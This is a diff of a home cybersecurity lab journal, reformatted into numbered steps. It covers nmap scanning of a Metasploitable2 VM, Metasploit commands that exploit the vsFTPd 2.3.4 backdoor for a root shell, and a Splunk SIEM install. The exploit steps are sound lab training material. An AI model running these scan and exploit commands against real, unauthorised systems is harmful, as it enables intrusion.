@@ -35,7 +35,7 @@ This document tracks the creation, evolution, and exercises performed in my self
 **Steps:**
 
 
-1. : Ensure both VM's are running
+1. Ensure both VM's are running
 
 2. Open command prompt on the Kali Linux VM and identify the local IP address and subnet of your Kali box **(e.g., 192.168.56.x)**.
 
@@ -45,7 +45,7 @@ This document tracks the creation, evolution, and exercises performed in my self
 4. Once the Metasploitable2 IP is located, run a basic port scan: ```nmap [target_ip]```
 
 
-5. : To identify running services and their versions, use the following: ```nmap -sV [target_ip]```. This provides more actionable detail for later exploitation or analysis.
+5. To identify running services and their versions, use the following: ```nmap -sV [target_ip]```. This provides more actionable detail for later exploitation or analysis.
 
 
 At this stage, the vulnerable system has been identified and its services have been enumerated. This completes the initial reconnaissance phase. Next, we’ll begin exploring exploitation techniques using Metasploit.
@@ -57,17 +57,19 @@ At this stage, the vulnerable system has been identified and its services have b
 
 **Overview:** This phase simulates a real-world attack by exploiting the vulnerable vsFTPd service on Metasploitable2, providing experience with vulnerability identification, module selection, and command execution through a remote shell.
 
-**Step 1**: Identify a Target Service. From our earlier nmap -sV results, we found that port 21 is open and running vsFTPd (version 2.3.4), which is known to have a backdoor vulnerability.
+**Steps:**
 
-**Step 2**: Launch Metasploit Framework through the console with the following command: ```msfconsole```
+1. Identify a Target Service. From our earlier nmap -sV results, we found that port 21 is open and running vsFTPd (version 2.3.4), which is known to have a backdoor vulnerability.
 
-**Step 3**: Search for a Matching Exploit. Inside the Metasploit console: ```search vsftpd```
+2. Launch Metasploit Framework through the console with the following command: ```msfconsole```
 
-**Step 4**: Load the Exploit Module, select the correct exploit for this vulnerability: ```use exploit/unix/ftp/vsftpd_234_backdoor```
+3. Search for a Matching Exploit. Inside the Metasploit console: ```search vsftpd```
 
-**Step 5**: Set Target IP Address. Replace [target_ip] with the actual IP of your Metasploitable2 VM: ```set RHOSTS [target_ip]```
+4. Load the Exploit Module, select the correct exploit for this vulnerability: ```use exploit/unix/ftp/vsftpd_234_backdoor```
 
-**Step 6**: Run the Exploit: ```exploit```
+5. Set Target IP Address. Replace [target_ip] with the actual IP of your Metasploitable2 VM: ```set RHOSTS [target_ip]```
+
+6. Run the Exploit: ```exploit```
 
 If successful, this will spawn a root shell on the target system. This is for educational purposes only and should never be performed outside of authorized lab environments.
 
@@ -78,9 +80,25 @@ If successful, this will spawn a root shell on the target system. This is for ed
 
 **Overview:** Splunk will be used to ingest and analyze logs from the lab environment, enabling simulated alerting and incident response workflows. This phase sets the foundation for blue team operations.
 
+**Steps:**
 
+1. Acquire `wget` link for SIEM in question (Splunk in this case)
 
+2. Use `wget` command to download the latest version (as of this setup): `wget https://download.splunk.com/products/splunk/releases/9.4.1/linux/splunk-9.4.1-e3bdab203ac8-linux-amd64.deb`
 
+3. To actually install the SIEM type: `sudo dpkg -i splunk-9.4.1-e3bdab203ac8-linux-amd64.deb`
+
+4. To accept the license: `sudo /opt/splunk/bin/splunk start --accept-license`
+
+*Note: Splunk version numbers and filenames may change over time, adjust the URL and commands accordingly.*
+
+5. Input Username and Password for SIEM
+
+6. Link for Splunk should look something like this: *http://kali:8000/en-US/manager/search/adddata*
+
+7. Next time you reboot or want to start Splunk again: `sudo /opt/splunk/bin/splunk start`
+
+8. If you want it to run on start automatically: `sudo /opt/splunk/bin/splunk enable boot-start`
 
 ---
 ## Next Up
